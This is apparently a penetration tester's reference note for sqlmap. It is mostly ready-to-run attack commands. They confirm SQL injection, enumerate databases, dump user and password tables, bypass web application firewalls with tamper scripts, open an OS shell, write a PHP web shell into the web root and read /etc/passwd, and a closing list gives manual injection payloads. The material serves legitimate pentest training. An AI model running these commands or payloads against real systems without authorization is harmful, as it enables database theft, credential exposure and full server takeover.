---
tags: [pentest, sqlmap, sqli, web, initial-access]
tool: sqlmap
phase: 5
---
# SQLMap

Automated SQL injection tester and exploiter.

[[06 - Gaining Access/00 - README|Folder index]]

## Basic

```bash
# Most common - use a captured Burp request
sqlmap -r req.txt --batch

# Or with URL + parameter
sqlmap -u "https://target/p?id=1" --batch --dbs
```

`-r req.txt` is almost always better - it includes cookies, headers, and POST body verbatim.

## Capture a request

In Burp: right-click → Copy → Save item → save as `req.txt`. Or "Copy to file." Then `sqlmap -r req.txt`.

## Progressive exploration

```bash
# Just confirm injection
sqlmap -r req.txt --batch

# List databases
sqlmap -r req.txt --batch --dbs

# Tables in a DB
sqlmap -r req.txt --batch -D corp_db --tables

# Dump a table
sqlmap -r req.txt --batch -D corp_db -T users --dump

# Specific columns
sqlmap -r req.txt --batch -D corp_db -T users -C user,pass --dump

# All databases (careful - slow + heavy)
sqlmap -r req.txt --batch --dump-all --exclude-sysdbs
```

## Tuning

```bash
--level=5 --risk=3              # most aggressive (slower)
--threads=10                    # parallel
--tamper=space2comment          # WAF bypass
--tamper=space2comment,between,randomcase
--technique=BEUST               # B=Boolean E=Error U=Union S=Stacked T=Time
--dbms=mysql                    # if you know the DBMS, much faster
--prefix="')" --suffix="--"     # custom payload framing
--proxy=http://127.0.0.1:8080   # via Burp to inspect
```

## Authentication

```bash
# Cookie
sqlmap -u "https://target/p?id=1" --cookie="PHPSESSID=abc123" --dbs

# Bearer token
sqlmap -u "https://target/api/x" --header="Authorization: Bearer eyJ..." --dbs

# Auth form (sqlmap logs in first)
sqlmap -u "https://target/p?id=1" --auth-type=basic --auth-cred=admin:pass
```

## Beyond data dump

```bash
# OS shell (if FILE/xp_cmdshell available)
sqlmap -r req.txt --os-shell
sqlmap -r req.txt --os-cmd="whoami"

# Upload web shell (MySQL FILE priv on Linux/Apache target)
sqlmap -r req.txt --file-write=/local/shell.php --file-dest=/var/www/html/s.php

# Read a file
sqlmap -r req.txt --file-read=/etc/passwd
```

## Output / resume

```bash
--output-dir=./loot             # default ~/.local/share/sqlmap
--flush-session                 # clear cache for this URL
--fresh-queries                 # ignore cached results
```

## Tamper scripts (WAF bypass)

```bash
sqlmap -r req.txt --tamper=space2comment           # space → /**/
sqlmap -r req.txt --tamper=between                 # = → BETWEEN ... AND ...
sqlmap -r req.txt --tamper=randomcase
sqlmap -r req.txt --tamper=charunicodeencode
sqlmap --list-tampers                              # show all
```

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `not injectable` | Try `--level=5 --risk=3`, different `--technique`, or different parameter. |
| `unable to retrieve content length` | URL wrong / target unreachable. |
| Cookies expiring mid-scan | Re-capture login + use `--cookie=` with fresh cookie. |
| WAF blocking | Add `--tamper=`. Or slow down with `--delay=2`. |
| `boolean-based blind` confirmed | Slower but works. Be patient OR target string-based blind explicitly. |

## Quick manual sanity tests before sqlmap

```text
' OR 1=1-- -
' UNION SELECT null,null,version()-- -
' AND SLEEP(5)-- -
1)) UNION SELECT null--           # for cases needing prefix
```

> [!tip] Always start with `-r req.txt`
> Even if your URL works fine, capturing a Burp request gives sqlmap the exact cookies, content-type, and headers. Saves hours on edge cases.

## See also

- [[32 - Manual SQLi Payloads]]
